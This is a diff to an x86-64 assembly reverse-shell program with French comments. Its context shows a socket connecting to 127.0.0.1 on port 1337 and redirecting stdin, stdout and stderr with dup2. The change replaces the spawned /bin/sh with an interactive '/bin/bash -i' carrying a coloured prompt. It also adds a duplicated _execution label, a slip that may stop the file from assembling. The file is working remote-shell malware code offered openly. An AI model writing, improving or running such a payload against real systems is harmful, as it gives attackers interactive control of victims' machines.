@@ -15,15 +15,26 @@ segment .rodata
 			at sin_port, dw 0x3905		; port in little endian
 			at sin_addr, dd 0x0100007f	; IP in little endian
 		iend
-
-		binsh db "/bin/sh", 0
-
 	error_socket  db "[X] Error: socket échoué", 10
 	error_connect db "[X] Error: connect échoué", 10
 	error_dup2_0  db "[X] Error: dup2 stdin échoué", 10
 	error_dup2_1  db "[X] Error: dup2 stdout échoué", 10
-    	error_dup2_2  db "[X] Error: dup2 stderr échoué", 10
-    	error_execve db "[X] Error: execve échoué", 10
+	error_dup2_2  db "[X] Error: dup2 stderr échoué", 10
+	error_execve db "[X] Error: execve échoué", 10
+
+segment .data
+    binsh db "/bin/bash", 0
+    arg0      db "bash", 0
+    arg1      db "-i", 0
+
+	argv:
+		dq arg0
+		dq arg1
+		dq 0
+	
+	ps1 db "PS1=\[\e[1;32m\]\u@\h:\w\$ \[\e[0m\]", 0
+
+    envp dq ps1, 0
 
 segment .text
 	global _start:
@@ -93,14 +104,16 @@ _fd_stderr:
 
 
 _execution:
-	mov rax, 59	; syscall for execve
-	mov rdi, binsh	; execute /bin/sh
-	xor rsi, rsi	; clean the rsi register
-	xor rdx, rdx	; clean rdx register
-	syscall
+	_execution:
+    mov rax, 59                  ; syscall execve
+    lea rdi, [rel binsh]     ; chemin vers /bin/bash
+    lea rsi, [rel argv]          ; argv = {"bash", "-i", NULL}
+    lea rdx, [rel envp]          ; envp = {PS1=..., NULL}
+    syscall
 
-	test rax, rax
-	js _execve_error
+    test rax, rax
+    js _execve_error
+
 
 _socket_error:
 	mov rsi, error_socket ; put the message in rsi
